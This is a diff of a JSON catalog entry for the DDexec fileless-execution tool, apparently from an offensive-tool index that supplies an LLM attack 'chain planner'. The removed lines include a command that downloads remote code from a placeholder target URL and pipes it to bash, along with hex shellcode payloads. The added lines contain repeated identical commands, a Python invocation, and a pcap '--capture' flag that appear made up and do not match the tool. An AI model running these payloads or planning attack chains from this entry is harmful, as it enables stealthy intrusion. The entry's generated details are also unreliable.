@@ -1,14 +1,13 @@
 {
   "category": "exploit",
   "command_examples": [
-    "bash ddexec.sh ls -lA < /bin/ls",
-    "wget -O- $KFIOSA_TARGET_URL | bash ddexec.sh argv0 foo bar",
-    "bash ddsc.sh -x <<< \"68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05\" &",
-    "cd /proc/$!/fd",
-    "wget -O 4 $KFIOSA_TARGET_URL",
-    "bash ddsc.sh -x <<< \"802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4c80580d2010000d4881580d2010000d4610280d2281080d2010000d4\"",
-    "SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)",
-    "SEEKER=xxd SEEKER_ARGS='-s $offset' zsh ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)"
+    "cd toolboxes/DDexec && python3 DDexec.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/DDexec && python3 DDexec.py --help",
+    "cd toolboxes/DDexec && python3 DDexec.py --help",
+    "cd toolboxes/DDexec && python3 DDexec.py --help",
+    "cd toolboxes/DDexec && python3 DDexec.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST DDexec --output $KFIOSA_OUTPUT_DIR/DDexec.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST DDexec --output $KFIOSA_OUTPUT_DIR/DDexec.log"
   ],
   "documentation": {
     "readme": "DDexec news I have updated DDexec so much it is barely recognizable, the parsing of the ELF is now done by machine code instead of by the shell script, making it far faster, reliable and comprehensible. It has also reduced its number of dependencies to the absolute minimum.",
@@ -129,6 +128,11 @@
       {
         "name": "--no-banner",
         "description": "Suppress banner / tool-name output.",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--capture",
+        "description": "Capture mode: write packets to a pcap file.",
         "source": "v2_enhancement"
       }
     ],
@@ -299,7 +303,9 @@
     "kfiosa",
     "indexed",
     "polymorphic",
-    "target-adaptive"
+    "target-adaptive",
+    "catalog",
+    "github"
   ],
   "trust": {
     "official_kali": false,
@@ -308,13 +314,12 @@
   },
   "url": "https://github.com/arget13/DDexec",
   "use_cases": [
-    "When you need exploit, use DDexec because DDexec news I have updated DDexec so much it is barely recognizable, the parsing of the ELF is now done by machine code instead of by the shell script, making i.",
-    "When you need a concrete invocation, run `bash ddexec.sh ls -lA < /bin/ls` as documented upstream for DDexec.",
-    "When you need a concrete invocation, run `wget -O- $KFIOSA_TARGET_URL | bash ddexec.sh argv0 foo bar` as documented upstream for DDexec.",
-    "When you need a concrete invocation, run `bash ddsc.sh -x <<< \"68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05\" &` as documented upstream for DDexec.",
-    "When you need a concrete invocation, run `cd /proc/$!/fd` as documented upstream for DDexec.",
-    "When chaining exploit tools, pair DDexec with sibling catalog entries sharing its attack_surface/phase_hint.",
-    "When validating lab setup, run `DDexec --help` (or the README entrypoint) and confirm required hardware/deps from the catalog."
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
   ],
   "_kfiosa_enriched_schema": "1.2.0",
   "_kfiosa_enriched_at": "phase4_t16",
